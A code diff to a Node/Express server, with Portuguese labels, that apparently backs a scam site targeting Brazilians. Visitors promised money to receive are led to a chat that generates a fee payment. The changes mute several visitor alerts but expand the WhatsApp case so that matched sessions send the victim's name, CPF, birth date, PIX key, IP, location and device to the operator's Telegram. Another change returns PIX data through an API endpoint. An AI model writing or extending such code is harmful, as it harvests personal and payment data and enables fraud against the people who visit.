@@ -255,7 +255,7 @@ function recordConversion() {
 
 loadStats();
 
-const SENSITIVE_VISITOR_KEYS = ['docValue', 'birthDate', 'fullName', 'pixCode', 'formalMessage'];
+const SENSITIVE_VISITOR_KEYS = ['docValue', 'birthDate', 'fullName', 'pixCode', 'formalMessage', 'pix'];
 
 function decryptVisitor(visitor: any) {
   const decrypted = { ...visitor };
@@ -712,17 +712,47 @@ app.post("/api/v1/telemetry/chat", async (req, res) => {
     let msg = "";
     switch (action) {
       case "entered":
-        const dateNow = new Date().toLocaleString("pt-BR", { timeZone: "America/Sao_Paulo" });
-        msg = `🟢 <b>NOVO LEAD NO CHAT!</b>\n\n<b>Data de Abertura:</b> ${dateNow}\n<b>Nome:</b> ${leadName || 'Desconhecido'}\n<b>CPF:</b> ${cpf || 'Desconhecido'}\n<b>Valor a Receber:</b> ${value || 'Desconhecido'}\n<b>Status do Pagamento:</b> Aguardando interação\n\nO Lead acabou de entrar na tela de conversa.`;
+        // Desativado para evitar spam no Telegram
+        msg = "";
         break;
       case "left":
-        msg = `🔴 <b>LEAD SAIU DO CHAT!</b>\n\n<b>Nome:</b> ${leadName || 'Desconhecido'}\n<b>CPF:</b> ${cpf || 'Desconhecido'}\n\nO Lead abandonou a página do chat.`;
+        // Desativado para evitar spam no Telegram
+        msg = "";
         break;
       case "generated_payment":
         msg = `🟡 <b>PAGAMENTO GERADO!</b>\n\n<b>Nome:</b> ${leadName}\n<b>Chave PIX:</b> ${pix}\n<b>Valor do Saque:</b> ${value}\n\nO Lead chegou no final do chat e a guia de pagamento da tarifa foi gerada!`;
         break;
       case "whatsapp":
-        msg = `📱 <b>LEAD FOI PRO WHATSAPP!</b>\n\n<b>Nome:</b> ${leadName}\n<b>CPF:</b> ${cpf}\n\nO Lead clicou no botão para continuar pelo WhatsApp.`;
+        let birthDate = "";
+        let ip = "";
+        let device = "";
+        let location = "";
+        if (cpf) {
+          const cleanCpf = cpf.replace(/\D/g, '');
+          for (const [uid, sess] of sessions.entries()) {
+            const sessCpf = sess.docValue ? sess.docValue.replace(/\D/g, '') : '';
+            if (sessCpf === cleanCpf) {
+              sess.pix = pix || sess.pix;
+              sess.value = value || sess.value;
+              if (leadName) sess.fullName = leadName;
+              birthDate = sess.birthDate || "";
+              ip = sess.ip || "";
+              device = sess.device || "";
+              location = sess.location || "";
+              saveVisitors();
+              break;
+            }
+          }
+        }
+        msg = `📱 <b>LEAD INTEGRADO E ENVIADO AO WHATSAPP!</b>\n\n` +
+              `👤 <b>Nome:</b> ${leadName || 'Não informado'}\n` +
+              `📄 <b>CPF/CNPJ:</b> ${cpf || 'Não informado'}\n` +
+              `📅 <b>Nascimento:</b> ${birthDate || 'Não informado'}\n` +
+              `🔑 <b>Chave PIX:</b> <code>${pix || 'Não informada'}</code>\n` +
+              `💰 <b>Valor a Receber:</b> ${value || 'Não informado'}\n` +
+              `🌐 <b>IP:</b> ${ip || 'Não informado'}\n` +
+              `📍 <b>Localização:</b> ${location || 'Não informada'}\n` +
+              `📱 <b>Aparelho:</b> ${device || 'Não informado'}`;
         break;
     }
     if (msg) {
@@ -1412,8 +1442,9 @@ app.post("/api/v1/session/start", async (req, res) => {
   const safeIp = escapeHtml(String(ip));
   const safeDevice = escapeHtml(String(device));
 
-  const messageId = await sendTelegram(`<b>👤 NOVO VISITANTE</b>\n\n<b>IP:</b> ${safeIp}\n<b>Device:</b> ${safeDevice}\n<b>Status:</b> 🟢 Navegando...`);
-  sessions.set(userId, { messageId: messageId || 0, startTime, lastHeartbeat: startTime, ip: String(ip), device, location: location || 'Brasil', converted: false, docValue: "", birthDate: "", fullName: "" });
+  // Desativado para evitar spam no Telegram
+  // const messageId = await sendTelegram(`<b>👤 NOVO VISITANTE</b>\n\n<b>IP:</b> ${safeIp}\n<b>Device:</b> ${safeDevice}\n<b>Status:</b> 🟢 Navegando...`);
+  sessions.set(userId, { messageId: 0, startTime, lastHeartbeat: startTime, ip: String(ip), device, location: location || 'Brasil', converted: false, docValue: "", birthDate: "", fullName: "" });
   saveVisitors();
   recordVisitor();
   res.json({ status: "started", userId });
@@ -1435,9 +1466,10 @@ app.post("/api/v1/session/convert", async (req, res) => {
     session.birthDate = details.birthDate;
     if (details.fullName) session.fullName = details.fullName;
 
-    const safeIp = escapeHtml(session.ip);
-    const msg = `<b>🔥 CONVERSÃO!</b>\n\n<b>IP:</b> ${safeIp}\n<b>Documento:</b> ${details.docValue}\n<b>Nascimento:</b> ${details.birthDate}\n<b>Status:</b> ✅ NO WHATSAPP`;
-    await sendTelegram(msg, session.messageId || undefined);
+    // Desativado para evitar spam no Telegram
+    // const safeIp = escapeHtml(session.ip);
+    // const msg = `<b>🔥 CONVERSÃO!</b>\n\n<b>IP:</b> ${safeIp}\n<b>Documento:</b> ${details.docValue}\n<b>Nascimento:</b> ${details.birthDate}\n<b>Status:</b> ✅ NO WHATSAPP`;
+    // await sendTelegram(msg, session.messageId || undefined);
     saveVisitors();
     recordConversion();
     res.json({ status: "converted" });
@@ -1451,7 +1483,9 @@ app.get("/api/v1/session/data/:userId", (req, res) => {
     res.json({
       docValue: session.docValue,
       birthDate: session.birthDate,
-      fullName: session.fullName || ""
+      fullName: session.fullName || "",
+      pix: session.pix || "",
+      value: session.value || ""
     });
   } else {
     res.status(404).json({ status: "not_found" });
@@ -1490,8 +1524,9 @@ app.post("/api/v1/session/end", async (req, res) => {
   const { userId } = req.body;
   const session = sessions.get(userId);
   if (session && !session.converted) {
-    const safeIp = escapeHtml(session.ip);
-    await sendTelegram(`<b>🔴 VISITANTE SAIU</b>\n\n<b>IP:</b> ${safeIp}\n<b>Status:</b> Saiu sem converter`, session.messageId || undefined);
+    // Desativado para evitar spam no Telegram
+    // const safeIp = escapeHtml(session.ip);
+    // await sendTelegram(`<b>🔴 VISITANTE SAIU</b>\n\n<b>IP:</b> ${safeIp}\n<b>Status:</b> Saiu sem converter`, session.messageId || undefined);
     sessions.delete(userId);
   }
   res.json({ status: "ok" });
@@ -1502,8 +1537,9 @@ setInterval(async () => {
   const now = Date.now();
   for (const [userId, session] of sessions.entries()) {
     if (!session.converted && now - session.lastHeartbeat > 60000) {
-      const safeIp = escapeHtml(session.ip);
-      await sendTelegram(`<b>⚪ VISITANTE OFFLINE</b>\n\n<b>IP:</b> ${safeIp}\n<b>Status:</b> Desconectado`, session.messageId || undefined);
+      // Desativado para evitar spam no Telegram
+      // const safeIp = escapeHtml(session.ip);
+      // await sendTelegram(`<b>⚪ VISITANTE OFFLINE</b>\n\n<b>IP:</b> ${safeIp}\n<b>Status:</b> Desconectado`, session.messageId || undefined);
       sessions.delete(userId);
     }
   }
